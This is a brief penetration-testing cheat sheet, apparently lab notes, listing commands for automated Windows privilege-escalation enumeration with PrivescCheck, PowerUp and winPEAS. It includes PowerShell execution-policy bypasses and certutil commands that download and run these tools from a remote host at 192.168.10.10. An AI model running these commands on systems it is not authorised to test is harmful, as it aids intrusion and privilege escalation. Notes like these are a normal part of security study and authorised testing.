# Automation

## PrivEscCheck

    powershell -ep bypass -c “. .\PrivescCheck.ps1; Invoke-PrivescCheck -Format TXT,HTML”

    powershell -ep bypass -c “. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML”


## PowerUp


    certutil.exe -urlcache -split -f http://192.168.10.10/PowerUp.ps1

    powershell -ep bypass

    . .\PowerUp.ps1

    Invoke-AllChecks (check all possible vulnerability except plaintext passwd)

## Winpeas.exe (All except plaintext passwd)


Windpeas.exe If .net 4.5 (run otherwise)

    certutil.exe -urlcache -split -f http://192.168.10.10:8080/winPEASx64.exe

    .\winPEASx64.exe
